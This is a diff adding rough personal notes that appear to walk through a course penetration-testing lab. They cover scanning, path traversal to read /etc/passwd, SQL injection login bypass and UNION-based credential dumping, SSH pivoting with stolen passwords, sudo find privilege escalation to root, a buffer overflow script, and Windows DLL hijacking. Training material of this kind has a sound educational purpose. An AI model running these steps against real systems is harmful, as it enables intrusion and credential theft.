@@ -1,0 +1,52 @@
+##### Starting from Op Station
+nmap scan the given ip, nmap 10.50.31.82 or nmap --script banner.nse 10.50.31.82 -p 22
+-> See that ssh is open on port 22
+Then open a netcat connection on nc 10.50.31.82 80, and run GET to be sure it's a web thing
+--> then enumerate with either:
+1. nmap --script http-enum.nse 10.50.31.82 -p 80
+2. nikto -h 10.50.31.82
+From both of these, you'll be able to see any hidden files, like /scripts/, that you may not see in the firefox source html code.
+Now lets firefox it.
+You can myfile=/../../../../../etc/passwd or hosts to see users
+On the uyser log in page, enter Tom' OR 1='1 for the user and password, then go to the Firefoxpost request to view the actual post request, then copy and paste it into the address bar with a question mark after the php: http://10.50.31.130/login.php?username=Tom%27+OR+1%3D%271&passwd=Tom%27+OR+1%3D%271
+View the source for the output page, then ou'll need to decode teh output to get the user/passwd arrays. It's either gonna be base64 or rot13
+Then decode it in rot13.com. In this case, you know it's rot13 because you already found that the user2 password has 78 at the end, just like the rot13'ed password. rot13 doesn't change teh location of numbers.
+
+### Now SSH into that target using your user2 credentials. 
+Basic enumeration: ifconfig, ps -elf, ip neigh, netstat -antp, /etc/hosts/, /etc/passwd, /etc/resolv.conf, cat /etc/nsswitch.conf
+You find another host in /etc/hosts. Now you wanna do a ping sweepover that network back in your opstation, assuming the first three octets
+
+
+##########Let's go to the web box you found in /etc/hosts from the previous host.
+You get options to access an sql table.
+You find that 192.168.28.181/pick.php?product=1 AND 1=1 does not work.
+Go through all of the product numbers and testing AND and OR to see which yields unusuable output.
+product 7 works.
+try: product=7 UNION SELECT table_schema,column_name,table_name from information_schema.columns
+The important stuff is in the bottom, for database of siteusers, which has the tables of customer, netproducts, purchose_history, shipping dates, and users.
+lets try: product =7 UNION SELECT name,username,userid from siteusers.users --> shows passwords, but they're rot13 encoded
+let's try: product =7 UNION SELECT @@version, loadfile("/etc/password),database()
+
+Go back to the box. You know theres an sql database, so normally, you could check it out just by doing "mysql". However, as user2, you don't have permissions. IOnstead, let's go to /var/www/html, then run mysql --user=webuser --password=sqlpass. You can view the sql tables directly here and get the same result as from the webpage. 
+
+From our earlier scan of the 192.168.28 network, we remember that we saw a .172 using ssh on port 22.
+On the 2nd box, we had a few user:passwd credential sets. To proxychains ssh into this .172 address from your Op Station, you'll have to try all of them until it works.
+######## Now in the third box (roundSensor)
+Let's do the basic enumeration steps listed above.
+Copy and paste the prior SuperScan.sh you've been using (the combo port scan, ping scan) into the new boxes /tmp file, and run it.
+You see that you have access to .179, with a ton of ports open, like 3389 and 9999. 
+To see what's going on try running a nc 192.168.28.0179 9999, and you'll see SecureServer
+Also try a basic netstat -antp.
+Search for .txt files of interest (as indicated by problem instructions) with find /
+Privilege escalation: sudo -l -> look for vulnerable commands.
+or do find /-type f -perm /4000 2>/dev/null, or /2000. If you see a command there sitting in /var/tmp or /tmp, that"s proabbly one of the ones you'll need to manually exploit.
+You notice that /usr/bin/find is one of the sudo -l commands. From GTFObins on find, you see that you can run "sudo find . -exec /bin/sh \; -quit". That will change you to root.
+You have a buffer overflow exploit on SecureServer port 9999 that we did earlier in the course. Create localport forwarding 4545 to the .172 port 22, then set up ssh -D 9050 Aaron@localhost -p 4545.
+Go to meelo_overflow.py, and change the ip address to .179. Then set up a 
+Tearing down that dynamic port, you can use xfreerdp if you set up a local port forwaring on 3390 to the final box's 3389. Set up the fwding, then do xfreerdp /v:localhost:3390 /u:<user> /p:<password> +clipboard
+
+#### You've RDPd into the final box. How do you privilege escalate?
+First run Services.msc and check for services without descritpsions.
+Next run tasklist on the cmd line.
+You see putty running at level 1 (administrator), but you're not an administrator, so that's weird.
+Find where it's located: where /R c:\ putty.exe, then do icacles \temp\putty.exe. You have permissions. to do DLL hijacking.
